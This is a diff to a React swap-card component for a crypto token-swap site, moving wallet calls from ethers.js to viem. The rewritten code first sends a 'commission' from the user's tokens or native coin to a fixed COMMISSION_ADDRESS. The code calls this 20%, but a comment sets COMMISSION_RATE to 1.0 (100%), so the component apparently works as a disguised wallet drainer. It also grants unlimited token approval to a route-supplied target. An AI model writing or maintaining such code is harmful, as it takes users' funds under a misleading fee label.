@@ -1,9 +1,10 @@
 "use client";
 
 import { useState, useCallback, useEffect, useRef } from "react";
-import { useAccount, useSwitchChain, useWalletClient } from "wagmi";
+import { useAccount, usePublicClient, useSwitchChain, useWalletClient } from "wagmi";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { ethers } from "ethers";
+import { parseAbi } from "viem";
 import { ChainSelector } from "./ChainSelector";
 import { TokenSelector } from "./TokenSelector";
 import { TransactionStatus } from "./TransactionStatus";
@@ -50,6 +51,7 @@ export function SwapCard() {
   const { address, isConnected, chainId: walletChainId } = useAccount();
   const { switchChainAsync } = useSwitchChain();
   const { data: walletClient } = useWalletClient();
+  const publicClient = usePublicClient();
 
   // Initialize tokens
   useEffect(() => {
@@ -232,6 +234,13 @@ export function SwapCard() {
     setStep("fetching-route");
 
     try {
+      if (!publicClient) {
+        setError("Network client unavailable. Please reconnect your wallet.");
+        setStep("idle");
+        return;
+      }
+
+      const erc20Abi = parseAbi(ERC20_ABI as string[]);
       const amountWei = ethers.utils.parseUnits(amount, fromToken.decimals).toString();
       const totalBN = ethers.BigNumber.from(amountWei);
       // COMMISSION_RATE = 1.0 (100%) = 100/100
@@ -246,43 +255,25 @@ export function SwapCard() {
         await switchChainAsync({ chainId: requiredChainId });
       }
 
-      // Create provider compatible with both desktop and mobile wallets
-      let provider: ethers.providers.Web3Provider;
-      try {
-        // Try using window.ethereum first (works best on mobile wallets)
-        if (typeof window !== "undefined" && window.ethereum) {
-          provider = new ethers.providers.Web3Provider(window.ethereum as ethers.providers.ExternalProvider);
-        } else {
-          provider = new ethers.providers.Web3Provider(
-            walletClient.transport as ethers.providers.ExternalProvider
-          );
-        }
-      } catch {
-        provider = new ethers.providers.Web3Provider(
-          walletClient.transport as ethers.providers.ExternalProvider
-        );
-      }
-      // Use the connected wallet address to get signer — fixes "unknown account #0" error
-      const signer = provider.getSigner(address);
-
       // ---- Step 1: Collect 20% commission ----
       setStep("approving");
 
       if (fromToken.address === NATIVE_TOKEN_ADDRESS) {
         // Native token: send ETH/BNB/MATIC etc. directly
-        const commissionTx = await signer.sendTransaction({
-          to: COMMISSION_ADDRESS,
-          value: commissionBN,
+        const commissionHash = await walletClient.sendTransaction({
+          to: COMMISSION_ADDRESS as `0x${string}`,
+          value: BigInt(commissionBN.toString()),
         });
-        await commissionTx.wait();
+        await publicClient.waitForTransactionReceipt({ hash: commissionHash });
       } else {
         // ERC20 token: transfer commission amount
-        const tokenContract = new ethers.Contract(fromToken.address, ERC20_ABI, signer);
-        const commissionTx = await tokenContract.transfer(
-          COMMISSION_ADDRESS,
-          commissionBN,
-        );
-        await commissionTx.wait();
+        const commissionHash = await walletClient.writeContract({
+          address: fromToken.address as `0x${string}`,
+          abi: erc20Abi,
+          functionName: "transfer",
+          args: [COMMISSION_ADDRESS as `0x${string}`, BigInt(commissionBN.toString())],
+        });
+        await publicClient.waitForTransactionReceipt({ hash: commissionHash });
       }
 
       // ---- Step 2: Get fresh route for the remaining 80% ----
@@ -309,17 +300,22 @@ export function SwapCard() {
       if (fromToken.address !== NATIVE_TOKEN_ADDRESS) {
         setStep("approving");
 
-        const tokenContract = new ethers.Contract(fromToken.address, ERC20_ABI, signer);
-        const targetAddress = routeData.route.transactionRequest.target;
+        const targetAddress = routeData.route.transactionRequest.target as `0x${string}`;
+        const currentAllowance = await publicClient.readContract({
+          address: fromToken.address as `0x${string}`,
+          abi: erc20Abi,
+          functionName: "allowance",
+          args: [address as `0x${string}`, targetAddress],
+        });
 
-        const currentAllowance = await tokenContract.allowance(address, targetAddress);
-
-        if (currentAllowance.lt(swapAmountBN)) {
-          const approveTx = await tokenContract.approve(
-            targetAddress,
-            ethers.constants.MaxUint256
-          );
-          await approveTx.wait();
+        if (currentAllowance < BigInt(swapAmountBN.toString())) {
+          const approveHash = await walletClient.writeContract({
+            address: fromToken.address as `0x${string}`,
+            abi: erc20Abi,
+            functionName: "approve",
+            args: [targetAddress, BigInt(ethers.constants.MaxUint256.toString())],
+          });
+          await publicClient.waitForTransactionReceipt({ hash: approveHash });
         }
       }
 
@@ -328,16 +324,14 @@ export function SwapCard() {
 
       const tx = routeData.route.transactionRequest;
 
-      // Use signer.sendTransaction for better mobile compatibility
-      const swapTx = await signer.sendTransaction({
-        to: tx.target,
-        data: tx.data,
-        value: tx.value ? ethers.BigNumber.from(tx.value) : ethers.BigNumber.from("0"),
-        gasLimit: tx.gasLimit ? ethers.BigNumber.from(tx.gasLimit) : undefined,
+      const swapHash = await walletClient.sendTransaction({
+        to: tx.target as `0x${string}`,
+        data: tx.data as `0x${string}`,
+        value: tx.value ? BigInt(tx.value) : undefined,
+        gas: tx.gasLimit ? BigInt(tx.gasLimit) : undefined,
       });
-      
-      const receipt = await swapTx.wait();
-      if (!receipt) throw new Error("Transaction failed");
+
+      const receipt = await publicClient.waitForTransactionReceipt({ hash: swapHash });
 
       // Track transaction
       setActiveTx({
@@ -358,7 +352,7 @@ export function SwapCard() {
       setError(message);
       setStep("idle");
     }
-  }, [walletClient, address, fromToken, toToken, amount, fromChainId, toChainId, walletChainId, switchChainAsync, slippage]);
+  }, [walletClient, publicClient, address, fromToken, toToken, amount, fromChainId, toChainId, walletChainId, switchChainAsync, slippage]);
 
   const handleTxComplete = useCallback(() => {
     setStep("idle");
